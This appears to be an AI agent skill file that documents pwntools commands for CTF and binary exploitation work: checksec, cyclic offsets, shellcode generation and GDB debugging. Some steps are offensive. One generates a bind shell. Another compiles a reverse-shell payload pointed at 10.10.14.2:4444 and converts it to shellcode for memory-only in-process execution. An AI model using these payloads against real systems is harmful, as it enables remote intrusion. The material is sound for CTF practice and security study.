---
name: pwntools-binary-exploitation
description: Use this skill whenever working with binary exploitation, reverse engineering, or CTF challenges involving PwnTools. Trigger for: generating shellcode, analyzing binaries with checksec, creating cyclic patterns for buffer overflows, converting ELF to shellcode, debugging with GDB, disassembling opcodes, or any pwntools-related task. Make sure to use this skill for any binary exploitation workflow, even if the user doesn't explicitly mention 'pwntools' or 'pwn'.
---

# PwnTools Binary Exploitation Helper

A skill for working with PwnTools in binary exploitation, reverse engineering, and CTF challenges.

## Quick Start

```bash
pip3 install pwntools
```

## Common Workflows

### 1. Binary Analysis with Checksec

Analyze binary protections before exploitation:

```bash
pwn checksec <executable>
```

This shows NX, PIE, Stack Canary, RELRO, and other protections.

### 2. Generate Cyclic Patterns for Buffer Overflows

Create unique patterns to find offsets in buffer overflows:

```bash
# Generate 3000-byte pattern
pwn cyclic 3000

# Find offset from pattern fragment
pwn cyclic -l faad
```

**Options:**
- Alphabet: lowercase chars by default
- Pattern length: default 4
- Context: 16, 32, 64-bit, linux, windows

### 3. Assembly and Shellcode Generation

**Get opcodes from assembly:**
```bash
pwn asm "jmp esp"
pwn asm -i <filepath>
```

**Generate shellcode:**
```bash
# List available shellcodes
pwn shellcraft -l

# List shellcodes matching pattern
pwn shellcraft -l amd

# Generate shellcode in C format
pwn shellcraft -f hex amd64.linux.sh

# Run shellcode to test
pwn shellcraft -r amd64.linux.sh

# Create bind shell on specific port
pwn shellcraft .r amd64.linux.bindsh 9095
```

**Shellcode options:**
- Avoid bytes: null, newlines, or custom list
- Debug: attach GDB to shellcode
- Output format: hex, string, C, ELF
- Generate as shared library

### 4. Debug with GDB

Attach GDB to processes:

```bash
# By executable
pwn debug --exec /bin/bash

# By PID
pwn debug --pid 1234

# By process name
pwn debug --process bash
```

**Options:**
- Context: 16, 32, 64-bit, linux, windows
- GDB script to execute
- Sysroot path

### 5. Disassemble and Hex Operations

**Disassemble opcodes:**
```bash
pwn disasm ffe4
```

**Convert to/from hex:**
```bash
# String to hex
pwn hex hola

# Hex to string
pwn unhex 686f6c61
```

**Hexdump files:**
```bash
pwn phd <file>
```

### 6. ELF to Shellcode Conversion (loader_append)

Convert a standalone ELF into raw shellcode that self-maps its segments. Ideal for memory-only loaders (e.g., Android JNI execution).

**Workflow:**

1. Build a static, position-independent payload ELF:
```bash
musl-gcc -O3 -s -static -o exploit exploit.c \
  -DREV_SHELL_IP="10.10.14.2" -DREV_SHELL_PORT="4444"
```

2. Convert ELF to shellcode using the bundled script:
```bash
python scripts/elf_to_shellcode.py ./exploit sc
```

3. Deliver shellcode to memory loader and execute in-process.

**Notes:**
- `loader_append` embeds the ELF and emits a loader that mmaps segments
- Be explicit about architecture (amd64, arm64, etc.)
- Keep payload position-independent
- Avoid assumptions about ASLR/NX

### 7. Generate Exploit Template

Create a Python template for remote/local exploitation:

```bash
pwn template
```

**Options:**
- Host, port, user, password
- Path to binary
- Quiet mode

### 8. Additional Utilities

**Disable NX on binary:**
```bash
pwn disablenx <filepath>
```

**Compare ELF files:**
```bash
pwn elfdiff <file1> <file2>
```

**Update PwnTools:**
```bash
pwn update
```

## Best Practices

1. **Always check protections first** - Use `checksec` before planning exploitation
2. **Use cyclic patterns** - For reliable offset discovery in buffer overflows
3. **Test shellcode locally** - Use `pwn shellcraft -r` before deployment
4. **Be explicit about architecture** - Set context with `context.clear(arch='amd64')`
5. **Keep shellcode position-independent** - Avoid hardcoded addresses
6. **Avoid bad bytes** - Filter nulls, newlines, and other problematic bytes

## Context Settings

Always set the appropriate context for your target:

```python
from pwn import *
context.clear(arch='amd64', os='linux')  # or 'windows'
context.bits = 64
context.word_size = 8
```

## References

- [Pwntools Documentation](https://docs.pwntools.com/en/stable/)
- [CoRPhone – ELF→shellcode pipeline for Android](https://github.com/0xdevil/corphone)
